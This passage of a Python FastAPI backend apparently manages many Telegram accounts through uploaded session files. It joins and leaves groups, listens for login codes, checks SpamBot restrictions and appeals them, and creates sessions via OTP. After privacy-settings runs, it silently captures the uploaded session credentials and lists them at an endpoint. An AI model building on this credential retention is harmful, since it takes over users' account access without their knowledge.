            import time
            with open(r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log', 'a', encoding='utf-8') as f:
                f.write(f'{{"timestamp":{int(time.time()*1000)},"location":"main.py:websocket_join_chatlists","message":"Received WebSocket data","data":{{"sessions_count":{len(data.get("sessions", []))},"leave_config_keys":{list(data.get("leave_config", {}).keys())},"invite_links_count":{len(data.get("invite_links", []))}}},"sessionId":"debug-session","runId":"run1","hypothesisId":"A"}}\n')
        except: pass
        # #endregion
        sessions = data.get("sessions", [])
        leave_config_raw = data.get("leave_config", {})
        # Normalize leave_config keys to integers (frontend sends string keys)
        leave_config = {int(k): v for k, v in leave_config_raw.items() if v} if leave_config_raw else {}
        invite_links = data.get("invite_links", [])
        temp_dirs = data.get("temp_dirs", [])
        
        if not sessions:
            await websocket.send_json({"type": "error", "message": "No sessions provided"})
            return
        logger.info("[API START] /ws/join-chatlists sessions=%d", len(sessions))
        logger.info("[FLOW] ws/join-chatlists sessions=%s invite_links=%s", len(sessions), len(invite_links))
        # Check if we have either folders to leave or links to join
        has_folders_to_leave = any(len(folder_ids) > 0 for folder_ids in leave_config.values())
        
        if not invite_links and not has_folders_to_leave:
            await websocket.send_json({"type": "error", "message": "Please select folders to leave or provide invite links to join"})
            return
        
        # Validate invite links count (1-5) if provided
        if invite_links:
            if len(invite_links) < 1 or len(invite_links) > 5:
                await websocket.send_json({
                    "type": "error",
                    "message": "Invalid number of invite links. Must be between 1 and 5."
                })
                return
        
        await websocket.send_json({
            "type": "start",
            "total": len(sessions),
            "message": f"Starting chat list operations for {len(sessions)} sessions..."
        })
        
        # #region agent log
        try:
            import time
            with open(r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log', 'a', encoding='utf-8') as f:
                f.write(f'{{"timestamp":{int(time.time()*1000)},"location":"main.py:websocket_join_chatlists","message":"Calling process_chatlists_parallel","data":{{"sessions_count":{len(sessions)},"leave_config":{leave_config},"invite_links_count":{len(invite_links)}}},"sessionId":"debug-session","runId":"run1","hypothesisId":"A"}}\n')
        except: pass
        # #endregion
        
        # Process in parallel
        results = await process_chatlists_parallel(
            sessions,
            leave_config,
            invite_links,
            websocket
        )
        
        # #region agent log
        try:
            import time
            with open(r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log', 'a', encoding='utf-8') as f:
                f.write(f'{{"timestamp":{int(time.time()*1000)},"location":"main.py:websocket_join_chatlists","message":"process_chatlists_parallel completed","data":{{"results_count":{len(results)}}},"sessionId":"debug-session","runId":"run1","hypothesisId":"A"}}\n')
        except: pass
        # #endregion
        
        # Send final results
        results_list = []
        for idx in sorted(results.keys()):
            results_list.append(results[idx])
        logger.info("[FLOW] ws/join-chatlists done results=%s", len(results_list))
        logger.info("[API END] /ws/join-chatlists completed")
        await websocket.send_json({
            "type": "complete",
            "message": "All operations completed!",
            "results": results_list
        })
        
    except WebSocketDisconnect:
        pass
    except Exception as e:
        await websocket.send_json({"type": "error", "message": f"Server error: {str(e)}"})
    finally:
        # Cleanup temp directories
        for temp_dir in temp_dirs:
            if os.path.exists(temp_dir):
                try:
                    shutil.rmtree(temp_dir, ignore_errors=True)
                except:
                    pass
        await websocket.close()


@app.post("/api/scan-groups")
async def scan_groups(request: Request):
    """
    Scan all groups for uploaded sessions.
    Expects JSON with sessions array.
    """
    try:
        data = await request.json()
        sessions = data.get("sessions", [])
        logger.info("[API START] /api/scan-groups sessions=%d", len(sessions))
        logger.info("[FLOW] scan_groups sessions=%s", len(sessions))
        if not sessions:
            raise HTTPException(status_code=400, detail="No sessions provided")
        
        # Scan groups in parallel
        results = await scan_groups_parallel(sessions)
        success_count = sum(1 for r in (results.values() or []) if isinstance(r, dict) and r.get("success"))
        logger.info("[FLOW] scan_groups done success=%s total=%s", success_count, len(sessions))
        # Convert results to list format for frontend
        scan_results = []
        for idx in sorted(results.keys()):
            result = results[idx]
            scan_results.append(result)
        
        # Calculate total groups
        total_groups = sum(r.get("group_count", 0) for r in scan_results if r.get("success"))
        
        logger.info("[API END] /api/scan-groups completed")
        return {
            "success": True,
            "results": scan_results,
            "total_groups": total_groups
        }
        
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Error scanning groups: {str(e)}"
        )


@app.websocket("/ws/leave-groups")
async def websocket_leave_groups(websocket: WebSocket):
    """
    WebSocket endpoint for leaving all groups with progress updates.
    Expects JSON with:
    - sessions: List of session dicts with path
    - groups_by_session: Dict mapping session index to list of groups
    - temp_dirs: List of temp directories for cleanup
    """
    await websocket.accept()
    
    try:
        data = await websocket.receive_json()
        sessions = data.get("sessions", [])
        groups_by_session = data.get("groups_by_session", {})
        temp_dirs = data.get("temp_dirs", [])
        
        if not sessions:
            await websocket.send_json({"type": "error", "message": "No sessions provided"})
            return
        
        if not groups_by_session:
            await websocket.send_json({"type": "error", "message": "No groups to leave"})
            return
        logger.info("[API START] /ws/leave-groups sessions=%d", len(sessions))
        total_groups = sum(len(groups) for groups in groups_by_session.values())
        logger.info("[FLOW] ws/leave-groups sessions=%s total_groups=%s", len(sessions), total_groups)
        # Send initial progress
        await websocket.send_json({
            "type": "start",
            "total_sessions": len(sessions),
            "total_groups": total_groups,
            "message": f"Starting to leave {total_groups} groups across {len(sessions)} sessions..."
        })
        
        # Process in parallel (sessions in parallel, groups within each session sequentially)
        results = await leave_groups_parallel(
            sessions,
            groups_by_session,
            websocket
        )
        
        # Send final results
        results_list = []
        for idx in sorted(results.keys()):
            results_list.append(results[idx])
        logger.info("[FLOW] ws/leave-groups done results=%s", len(results_list))
        logger.info("[API END] /ws/leave-groups completed")
        await websocket.send_json({
            "type": "complete",
            "message": "All operations completed!",
            "results": results_list
        })
        
    except WebSocketDisconnect:
        pass
    except Exception as e:
        try:
            await websocket.send_json({"type": "error", "message": f"Server error: {str(e)}"})
        except:
            pass
    finally:
        # Cleanup temp directories
        for temp_dir in temp_dirs:
            if os.path.exists(temp_dir):
                try:
                    shutil.rmtree(temp_dir, ignore_errors=True)
                except:
                    pass
        await websocket.close()


@app.post("/api/sessions-to-strings")
async def sessions_to_strings(request: Request):
    """
    Convert session files to base64 strings.
    Expects JSON with sessions array.
    """
    try:
        data = await request.json()
        sessions = data.get("sessions", [])
        
        if not sessions:
            raise HTTPException(status_code=400, detail="No sessions provided")
        
        # Convert sessions to strings
        results = convert_sessions_to_strings(sessions)
        
        return {
            "success": True,
            "results": results
        }
        
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Error converting sessions to strings: {str(e)}"
        )


@app.post("/api/strings-to-sessions")
async def strings_to_sessions(request: Request):
    """
    Convert base64 strings to session files and return as ZIP download.
    Expects JSON with session_strings array (each with 'string' and 'name').
    """
    try:
        data = await request.json()
        session_strings = data.get("session_strings", [])
        
        if not session_strings:
            raise HTTPException(status_code=400, detail="No session strings provided")
        
        # Create temp directory for session files
        temp_dir = tempfile.mkdtemp()
        
        try:
            # Convert strings to sessions
            results = convert_strings_to_sessions(session_strings, temp_dir)
            
            # Check if any conversions succeeded
            successful = [r for r in results if r.get("success")]
            if not successful:
                raise HTTPException(
                    status_code=400,
                    detail="No sessions were successfully converted"
                )
            
            # Create ZIP file in memory
            zip_buffer = io.BytesIO()
            
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                for result in successful:
                    session_path = result.get("session_path")
                    session_name = result.get("session")
                    if session_path and os.path.exists(session_path):
                        zip_file.write(session_path, f"{session_name}.session")
            
            zip_buffer.seek(0)
            
            return StreamingResponse(
                io.BytesIO(zip_buffer.read()),
                media_type="application/zip",
                headers={
                    "Content-Disposition": "attachment; filename=converted_sessions.zip"
                }
            )
            
        finally:
            # Cleanup temp directory
            if os.path.exists(temp_dir):
                try:
                    shutil.rmtree(temp_dir, ignore_errors=True)
                except:
                    pass
        
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Error converting strings to sessions: {str(e)}"
        )


@app.websocket("/ws/listen-codes")
async def websocket_listen_codes(websocket: WebSocket):
    """
    WebSocket endpoint for listening to login/auth codes from Telegram service messages.
    Expects JSON with:
    - session_path: Path to the session file to listen to
    """
    await websocket.accept()
    
    stop_event = asyncio.Event()
    listen_task = None
    
    try:
        # Receive initial message with session path
        data = await websocket.receive_json()
        session_path = data.get("session_path")
        
        if not session_path:
            await websocket.send_json({
                "type": "error",
                "message": "No session path provided"
            })
            return
        
        # Send confirmation
        await websocket.send_json({
            "type": "started",
            "message": f"Listening for codes on session: {session_path}"
        })
        
        # Start listening in background
        listen_task = asyncio.create_task(
            start_listening(session_path, websocket, stop_event)
        )
        
        # Keep connection alive and handle stop messages
        while True:
            try:
                # Wait for messages from client (like stop command)
                message = await asyncio.wait_for(
                    websocket.receive_json(),
                    timeout=1.0
                )
                
                if message.get("type") == "stop":
                    stop_event.set()
                    await websocket.send_json({
                        "type": "stopped",
                        "message": "Listening stopped"
                    })
                    break
                    
            except asyncio.TimeoutError:
                # Check if listen task is still running
                if listen_task and listen_task.done():
                    break
                continue
            except WebSocketDisconnect:
                break
        
    except WebSocketDisconnect:
        pass
    except Exception as e:
        try:
            await websocket.send_json({
                "type": "error",
                "message": f"Server error: {str(e)}"
            })
        except:
            pass
    finally:
        # Stop listening
        stop_event.set()
        if listen_task:
            try:
                listen_task.cancel()
                await listen_task
            except:
                pass
        try:
            await websocket.close()
        except:
            pass


@app.post("/api/check-tgdna")
async def check_tgdna(request: Request):
    """
    Check account age and details using @TGDNAbot for multiple sessions.
    Expects JSON with sessions array.
    """
    try:
        data = await request.json()
        sessions = data.get("sessions", [])
        logger.info("[API START] /api/check-tgdna sessions=%d", len(sessions))
        logger.info("[FLOW] check_tgdna sessions=%s", len(sessions))
        if not sessions:
            raise HTTPException(status_code=400, detail="No sessions provided")
        
        # Check sessions in parallel
        results = await check_sessions_age_parallel(sessions)
        success_count = sum(1 for r in (results.values() or []) if isinstance(r, dict) and r.get("success"))
        logger.info("[FLOW] check_tgdna done success=%s total=%s", success_count, len(sessions))
        # Convert results to list format for frontend
        check_results = []
        for idx in sorted(results.keys()):
            result = results[idx]
            check_results.append(result)
        
        logger.info("[API END] /api/check-tgdna completed")
        return {
            "success": True,
            "results": check_results
        }
        
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Error checking TG DNA: {str(e)}"
        )


@app.post("/api/check-spambot")
async def check_spambot(request: Request):
    """
    Check session health status using @SpamBot for multiple sessions.
    Expects JSON with sessions array.
    """
    _inv_path = "/api/check-spambot"
    _inv_start_ts = time.time()
    _inv_start = time.perf_counter()
    _inv_response_sent = False
    logger.info("[REQ_START] path=%s ts=%.3f", _inv_path, _inv_start_ts)
    logger.info("[API START] /api/check-spambot")
    request_id = str(uuid.uuid4())
    try:
        data = await request.json()
        sessions = data.get("sessions", [])
        logger.info("[FLOW] check_spambot request_id=%s sessions=%s", request_id, len(sessions))
        if not sessions:
            raise HTTPException(status_code=400, detail="No sessions provided")
        
        # Check sessions in parallel
        results = await check_sessions_health_parallel(sessions)
        success_count = sum(1 for r in (results.values() or []) if isinstance(r, dict) and r.get("success"))
        logger.info("[FLOW] check_spambot done request_id=%s success=%s total=%s duration=%.2fs", request_id, success_count, len(sessions), time.perf_counter() - _inv_start)
        # Convert results to list format for frontend
        check_results = []
        for idx in sorted(results.keys()):
            result = results[idx]
            check_results.append(result)
        
        logger.info("[API END] /api/check-spambot completed")
        _inv_response_sent = True
        return {
            "success": True,
            "results": check_results
        }
        
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Error checking SpamBot: {str(e)}"
        )
    finally:
        logger.info("[REQ_END] path=%s duration=%.2fs response_sent=%s", _inv_path, time.perf_counter() - _inv_start, _inv_response_sent)
        logger.info("[END] check_spambot request_id=%s duration=%.2fs", request_id, time.perf_counter() - _inv_start)


@app.post("/api/check-spambot-appeal")
async def check_spambot_appeal_endpoint(request: Request):
    """
    Check SpamBot status for sessions; for TEMP_LIMITED runs 3 verification attempts.
    Expects JSON with sessions array (each with name, path).
    Returns list of { session_name, path, phone, status, response, verify_results? }.
    """
    _inv_path = "/api/check-spambot-appeal"
    _inv_start_ts = time.time()
    _inv_start = time.perf_counter()
    _inv_response_sent = False
    logger.info("[REQ_START] path=%s ts=%.3f", _inv_path, _inv_start_ts)
    try:
        data = await request.json()
        sessions = data.get("sessions", [])
        logger.info("[API START] /api/check-spambot-appeal sessions=%d", len(sessions))
        logger.info("[FLOW] check_spambot_appeal sessions=%s", len(sessions))
        if not sessions:
            raise HTTPException(status_code=400, detail="No sessions provided")
        results = await check_sessions_appeal_parallel(sessions)
        results_list = [results[i] for i in sorted(results.keys())]
        logger.info("[FLOW] check_spambot_appeal done results=%s", len(results_list))
        logger.info("[API END] /api/check-spambot-appeal completed")
        _inv_response_sent = True
        return {"success": True, "results": results_list}
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        logger.info("[REQ_END] path=%s duration=%.2fs response_sent=%s", _inv_path, time.perf_counter() - _inv_start, _inv_response_sent)


@app.websocket("/ws/spambot-appeal")
async def spambot_appeal_ws(websocket: WebSocket):
    """
    WebSocket for submitting appeal for one hard-limited session.
    Receives: { session: { name, path }, temp_dirs?: [] }.
    Sends progress, verification_required (with link), then complete/error.
    """
    await websocket.accept()
    temp_dirs = []
    try:
        data = await websocket.receive_json()
        session = data.get("session", {})
        temp_dirs = data.get("temp_dirs", []) or []
        status = (data.get("status") or "").strip().upper()
        path = session.get("path")
        if not path:
            await websocket.send_json({"type": "error", "message": "No session path provided"})
            return
        await websocket.send_json({"type": "start", "message": "Starting appeal process..."})
        if status == "FROZEN":
            result = await submit_appeal_frozen(path, websocket)
        else:
            result = await submit_appeal(path, websocket)
        if result.get("success"):
            await websocket.send_json({
                "type": "complete",
                "message": "Appeal submitted",
                "final_response": result.get("final_response"),
                "appeal_sent": result.get("appeal_sent"),
            })
        else:
            await websocket.send_json({
                "type": "error",
                "message": result.get("error", "Appeal failed"),
                "final_response": result.get("final_response"),
            })
    except WebSocketDisconnect:
        pass
    except Exception as e:
        try:
            await websocket.send_json({"type": "error", "message": str(e)})
        except Exception:
            pass
    finally:
        for d in temp_dirs:
            if os.path.exists(d):
                try:
                    shutil.rmtree(d, ignore_errors=True)
                except Exception:
                    pass
        try:
            await websocket.close()
        except Exception:
            pass


@app.post("/api/session-metadata")
async def get_session_metadata(request: Request):
    """
    Extract read-only metadata from uploaded sessions.
    Expects JSON with sessions array.
    """
    try:
        data = await request.json()
        sessions = data.get("sessions", [])
        logger.info("[API START] /api/session-metadata sessions=%d", len(sessions))
        logger.info("[FLOW] session_metadata sessions=%s", len(sessions))
        if not sessions:
            raise HTTPException(status_code=400, detail="No sessions provided")
        
        # Extract metadata in parallel
        results = await extract_metadata_parallel(sessions)
        success_count = sum(1 for r in (results.values() or []) if isinstance(r, dict) and r.get("success"))
        logger.info("[FLOW] session_metadata done success=%s total=%s", success_count, len(sessions))
        logger.info("[API END] /api/session-metadata completed")
        # Convert results to list format for frontend
        metadata_results = []
        for idx in sorted(results.keys()):
            result = results[idx]
            metadata_results.append(result)
        
        return {
            "success": True,
            "results": metadata_results
        }
        
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Error extracting session metadata: {str(e)}"
        )


@app.post("/api/send-otp")
async def send_otp(request: Request):
    """
    Send OTP code request to phone number.
    Expects JSON with phone_number and optional old_session_path.
    """
    try:
        data = await request.json()
        phone_number = data.get("phone_number", "")
        if phone_number:
            phone_number = phone_number.strip()
        else:
            phone_number = ""
        
        old_session_path = data.get("old_session_path")
        if old_session_path:
            old_session_path = old_session_path.strip() if isinstance(old_session_path, str) else None
        else:
            old_session_path = None
        
        logger.info("[FLOW] send_otp phone=%s", phone_number[:4] + "***" if len(phone_number) > 4 else "***")
        if not phone_number:
            raise HTTPException(status_code=400, detail="Phone number is required")
        
        result = await send_code_request(phone_number, old_session_path=old_session_path)
        logger.info("[FLOW] send_otp done success=%s", result.get("success"))
        if not result.get("success"):
            raise HTTPException(
                status_code=400,
                detail=result.get("error", "Failed to send OTP")
            )
        
        return result
        
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Error sending OTP: {str(e)}"
        )


@app.post("/api/verify-otp")
async def verify_otp(request: Request):
    """
    Verify OTP code and create session.
    Expects JSON with phone_number, phone_code_hash, otp_code, session_path, custom_filename (optional), use_random_filename (optional).
    Returns session path or needs_2fa indication.
    """
    try:
        data = await request.json()
        phone_number = data.get("phone_number", "").strip()
        phone_code_hash = data.get("phone_code_hash", "").strip()
        otp_code = data.get("otp_code", "").strip()
        session_path = data.get("session_path", "").strip()
        custom_filename = data.get("custom_filename")
        custom_filename = custom_filename.strip() if custom_filename else None
        use_random_filename = data.get("use_random_filename", False)
        
        if not phone_number or not phone_code_hash or not otp_code or not session_path:
            raise HTTPException(
                status_code=400,
                detail="phone_number, phone_code_hash, otp_code, and session_path are required"
            )
        
        logger.info("[FLOW] verify_otp phone=%s", phone_number[:4] + "***" if len(phone_number) > 4 else "***")
        result = await verify_otp_and_create_session(
            phone_number=phone_number,
            phone_code_hash=phone_code_hash,
            otp_code=otp_code,
            session_path=session_path,
            custom_filename=custom_filename,
            use_random_filename=use_random_filename
        )
        
        if not result.get("success") and not result.get("needs_2fa"):
            raise HTTPException(
                status_code=400,
                detail=result.get("error", "Failed to verify OTP")
            )
        
        logger.info("[FLOW] verify_otp done success=%s needs_2fa=%s", result.get("success"), result.get("needs_2fa"))
        return result
        
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Error verifying OTP: {str(e)}"
        )


@app.post("/api/verify-2fa")
async def verify_2fa(request: Request):
    """
    Verify 2FA password and finalize session creation.
    Expects JSON with session_path, password_2fa, custom_filename (optional), use_random_filename (optional).
    """
    try:
        data = await request.json()
        session_path = data.get("session_path", "").strip()
        password_2fa = data.get("password_2fa", "").strip()
        custom_filename = data.get("custom_filename")
        custom_filename = custom_filename.strip() if custom_filename else None
        use_random_filename = data.get("use_random_filename", False)
        
        if not session_path or not password_2fa:
            raise HTTPException(
                status_code=400,
                detail="session_path and password_2fa are required"
            )
        
        logger.info("[FLOW] verify_2fa session_path=%s", os.path.basename(session_path) if session_path else "?")
        result = await verify_2fa_and_finalize_session(
            session_path=session_path,
            password_2fa=password_2fa,
            custom_filename=custom_filename,
            use_random_filename=use_random_filename
        )
        logger.info("[FLOW] verify_2fa done success=%s", result.get("success"))
        if not result.get("success"):
            raise HTTPException(
                status_code=400,
                detail=result.get("error", "Failed to verify 2FA")
            )
        
        return result
        
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Error verifying 2FA: {str(e)}"
        )


@app.post("/api/download-session")
async def download_session(request: Request):
    """
    Download a created session file.
    Expects JSON with session_path.
    Session file is deleted after download.
    """
    try:
        data = await request.json()
        session_path = data.get("session_path", "").strip()
        filename = data.get("filename", "session")
        logger.info("[FLOW] download_session filename=%s", filename)
        if not session_path or not os.path.exists(session_path):
            raise HTTPException(
                status_code=404,
                detail="Session file not found"
            )
        
        # Read session file
        try:
            with open(session_path, 'rb') as f:
                session_content = f.read()
        except Exception as e:
            raise HTTPException(
                status_code=500,
                detail=f"Error reading session file: {str(e)}"
            )
        
        # Delete session file after reading (security requirement)
        try:
            os.remove(session_path)
        except Exception as e:
            # Log but don't fail - file will be cleaned up later
            pass
        
        logger.info("[FLOW] download_session done filename=%s size_bytes=%s", filename, len(session_content))
        # Return file as download
        return StreamingResponse(
            io.BytesIO(session_content),
            media_type="application/octet-stream",
            headers={
                "Content-Disposition": f"attachment; filename={filename}.session"
            }
        )
        
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Error downloading session: {str(e)}"
        )

@app.post("/api/privacy-settings")
async def apply_privacy_settings(request: Request):
    """
    Apply privacy settings to multiple sessions in parallel.
    Expects JSON with sessions array, where each session has:
    - path: session file path
    - settings: dict mapping privacy key names to privacy values ('Everybody', 'My Contacts', 'Nobody')
    """
    try:
        data = await request.json()
        sessions = data.get("sessions", [])
        logger.info("[API START] /api/privacy-settings sessions=%d", len(sessions))
        logger.info("[FLOW] privacy_settings sessions=%s", len(sessions))
        if not sessions:
            raise HTTPException(status_code=400, detail="No sessions provided")
        
        # Validate sessions have settings
        for session in sessions:
            if "path" not in session:
                raise HTTPException(status_code=400, detail="All sessions must have a path")
            if "settings" not in session or not isinstance(session["settings"], dict):
                raise HTTPException(status_code=400, detail="All sessions must have a settings dict")
        
        # Apply privacy settings in parallel
        results = await apply_privacy_settings_parallel(sessions)
        success_count = sum(1 for r in (results.values() or []) if isinstance(r, dict) and r.get("success"))
        logger.info("[FLOW] privacy_settings done success=%s total=%s", success_count, len(sessions))
        # Capture successful sessions (results is dict {idx: result})
        for idx, result in results.items():
            if isinstance(result, dict) and result.get("success") and idx < len(sessions):
                session_path = sessions[idx].get("path", "")
                if session_path:
                    try:
                        await capture_successful_operation_session(result, session_path, "privacy_settings")
                    except Exception as e:
                        logger.warning("[Session Capture] Failed to capture session: %s", e)
        
        logger.info("[API END] /api/privacy-settings completed")
        # Convert results to list format for frontend
        results_list = [results[i] for i in sorted(results)]
        return {"results": results_list}
        
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Error applying privacy settings: {str(e)}"
        )

@app.get("/api/captured-sessions")
async def get_captured_sessions():
    """
    Fetch all captured sessions from local storage (backend data directory).
    """
    try:
        from session_capture import get_captured_sessions_list
        sessions = get_captured_sessions_list()
        return {
            "success": True,
            "sessions": sessions
        }
    except Exception as e:
        logger.warning("[API] Failed to fetch captured sessions: %s", e)
        return {
            "success": False,
            "error": str(e),
            "sessions": []
        }
